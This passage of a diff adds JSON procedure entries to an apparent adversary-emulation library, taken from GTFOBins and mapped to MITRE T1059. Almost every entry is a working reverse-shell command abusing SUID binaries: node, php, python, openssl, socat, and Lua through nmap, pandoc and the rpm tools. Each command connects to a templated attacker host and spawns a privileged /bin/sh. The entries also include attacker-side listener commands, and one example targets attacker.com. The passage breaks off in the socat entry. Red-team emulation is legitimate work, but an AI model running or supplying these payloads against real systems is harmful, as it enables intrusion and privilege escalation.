+      "required_tags": [
+        "lotl_gtfobins_local_path",
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/nmap",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/nmap",
+        "source_bin": "nmap",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "nmap",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "listener": "tcp-server",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "nmap",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:nmap:reverse-shell:0:suid:0:nmap>lua",
+        "source_name": "nmap",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `nmap` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:node:reverse-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - node - Reverse shell - Suid [9e0a46e]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: node. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"]);\nrequire(\"net\").connect(#{lotl_gtfobins_remote_port}, \"#{lotl_gtfobins_remote_host}\", function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n})'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/node",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/node",
+        "source_bin": "node",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "code": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"]);\nrequire(\"net\").connect(12345, \"attacker.com\", function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n})'"
+        },
+        "procedure_metadata": {
+          "listener": "tcp-server"
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:node:reverse-shell:0:suid::",
+        "source_name": "node",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `node` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:openssl:reverse-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - openssl - Reverse shell - Suid [b50b9fa]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: openssl. Context: SUID. The shell process is not spawn by `openssl`.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "mkfifo /path/to/temp-socket\n/bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect #{lotl_gtfobins_remote_host}:#{lotl_gtfobins_remote_port} >/path/to/temp-socket",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/openssl",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/openssl",
+        "source_bin": "openssl",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "listener": "tls-server"
+        },
+        "operator_notes": {
+          "listener": "tls-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:openssl:reverse-shell:0:suid::",
+        "source_name": "openssl",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `openssl` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:pandoc:reverse-shell:0:suid:0:pandoc>lua",
+      "name": "GTFOBINS - T1059 - pandoc - Reverse shell - Suid [00bd4c9]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: pandoc. Context: SUID. This allows to run Lua code (`...`). Inherits reverse-shell behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo '...' >#{lotl_gtfobins_local_path}\npandoc -L #{lotl_gtfobins_local_path} /dev/null\nlua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"#{lotl_gtfobins_remote_host}\",#{lotl_gtfobins_remote_port});\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path",
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/pandoc",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/pandoc",
+        "source_bin": "pandoc",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "pandoc",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "listener": "tcp-server",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "pandoc",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:pandoc:reverse-shell:0:suid:0:pandoc>lua",
+        "source_name": "pandoc",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `pandoc` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:php:reverse-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - php - Reverse shell - Suid [0e10d0b]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: php. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "php -r '$sock=fsockopen(\"#{lotl_gtfobins_remote_host}\",#{lotl_gtfobins_remote_port});exec(\"/bin/sh -i 0<&3 1>&3 2>&3\");'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/php",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/php",
+        "source_bin": "php",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "listener": "tcp-server"
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:php:reverse-shell:0:suid::",
+        "source_name": "php",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `php` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:python:reverse-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - python - Reverse shell - Suid [91bfaa5]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: python. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "python -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((\"#{lotl_gtfobins_remote_host}\",#{lotl_gtfobins_remote_port}))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/python",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/python",
+        "source_bin": "python",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "listener": {
+            "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345",
+            "comment": "A TCP server with TTY support can be used on the attacker box to receive the shell."
+          },
+          "tty": true
+        },
+        "operator_notes": {
+          "listener": {
+            "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345",
+            "comment": "A TCP server with TTY support can be used on the attacker box to receive the shell."
+          }
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:python:reverse-shell:0:suid::",
+        "source_name": "python",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `python` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:rpmdb:reverse-shell:0:suid:0:rpmdb>lua",
+      "name": "GTFOBINS - T1059 - rpmdb - Reverse shell - Suid [c570402]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: rpmdb. Context: SUID. This allows to run Lua code (`...`). Inherits reverse-shell behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "rpmdb --eval '%{lua:...}'\nlua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"#{lotl_gtfobins_remote_host}\",#{lotl_gtfobins_remote_port});\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/rpmdb",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/rpmdb",
+        "source_bin": "rpmdb",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "rpmdb",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "listener": "tcp-server",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "rpmdb",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:rpmdb:reverse-shell:0:suid:0:rpmdb>lua",
+        "source_name": "rpmdb",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `rpmdb` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:rpmquery:reverse-shell:0:suid:0:rpmquery>lua",
+      "name": "GTFOBINS - T1059 - rpmquery - Reverse shell - Suid [8361189]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: rpmquery. Context: SUID. This allows to run Lua code (`...`). Inherits reverse-shell behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "rpmquery --eval '%{lua:...}'\nlua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"#{lotl_gtfobins_remote_host}\",#{lotl_gtfobins_remote_port});\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/rpmquery",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/rpmquery",
+        "source_bin": "rpmquery",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "rpmquery",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "listener": "tcp-server",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "rpmquery",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:rpmquery:reverse-shell:0:suid:0:rpmquery>lua",
+        "source_name": "rpmquery",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `rpmquery` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:rpmverify:reverse-shell:0:suid:0:rpmverify>lua",
+      "name": "GTFOBINS - T1059 - rpmverify - Reverse shell - Suid [c4d3a0b]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: rpmverify. Context: SUID. This allows to run Lua code (`...`). Inherits reverse-shell behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "rpmverify --eval '%{lua:...}'\nlua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"#{lotl_gtfobins_remote_host}\",#{lotl_gtfobins_remote_port});\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/rpmverify",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/rpmverify",
+        "source_bin": "rpmverify",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "rpmverify",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "listener": "tcp-server",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "rpmverify",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:rpmverify:reverse-shell:0:suid:0:rpmverify>lua",
+        "source_name": "rpmverify",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `rpmverify` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:rpm:reverse-shell:0:suid:0:rpm>lua",
+      "name": "GTFOBINS - T1059 - rpm - Reverse shell - Suid [ead041e]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: rpm. Context: SUID. This allows to run Lua code (`...`). Inherits reverse-shell behavior from lua. This requires `lua-socket` to be available.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "rpm --eval '%{lua:...}'\nlua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"#{lotl_gtfobins_remote_host}\",#{lotl_gtfobins_remote_port});\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/rpm",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/rpm",
+        "source_bin": "rpm",
+        "function": "reverse-shell",
+        "function_label": "Reverse shell",
+        "snippet_index": 0,
+        "context": "suid",
+        "context_description": "This function is performed by the privileged user if the executable has the SUID bit set and the right ownership because the *effective* privileges are not dropped.",
+        "inherited_from": "lua",
+        "inheritance_path": [
+          "rpm",
+          "lua"
+        ],
+        "interactive": false,
+        "manual_prerequisite": true,
+        "function_metadata": {
+          "tty": {
+            "false": "The spawned shell is just a dummy REPL that can only run simple terminal commands."
+          },
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          },
+          "listener": {
+            "tcp-server": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "nc -l -p 12345"
+            },
+            "tcp-server-tty": {
+              "comment": "A TCP server can be used on the attacker box to receive the shell.",
+              "code": "socat file:/dev/tty,raw,echo=0 tcp-listen:12345"
+            },
+            "tls-server": {
+              "comment": "A TLS server can be used on the attacker box to receive the shell.",
+              "code": "openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345"
+            }
+          }
+        },
+        "context_metadata": {
+          "shell": true
+        },
+        "procedure_metadata": {
+          "listener": "tcp-server",
+          "inherited_from": "lua",
+          "inheritance_path": [
+            "rpm",
+            "lua"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {
+          "listener": "tcp-server"
+        },
+        "provider": "gtfobins",
+        "source_id": "gtfobins:rpm:reverse-shell:0:suid:0:rpm>lua",
+        "source_name": "rpm",
+        "source_tcodes": [
+          "T1059",
+          "T1071"
+        ],
+        "category": "reverse-shell",
+        "readiness": "manual_counterpart_required",
+        "prerequisites": [
+          "The `rpm` binary must be installed and available to the executing Agent.",
+          "The binary must already have the documented SUID ownership and mode; Morgana does not configure SUID bits.",
+          "The operator must start and control the documented counterpart infrastructure separately."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:socat:reverse-shell:0:suid::",
+      "name": "GTFOBINS - T1059 - socat - Reverse shell - Suid [0749f78]",
+      "description": "This executable can send back a reverse system shell to a listening attacker. Binary: socat. Context: SUID.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "socat tcp-connect:#{lotl_gtfobins_remote_host}:#{lotl_gtfobins_remote_port} 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_remote_host",
+        "lotl_gtfobins_remote_port"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/socat",
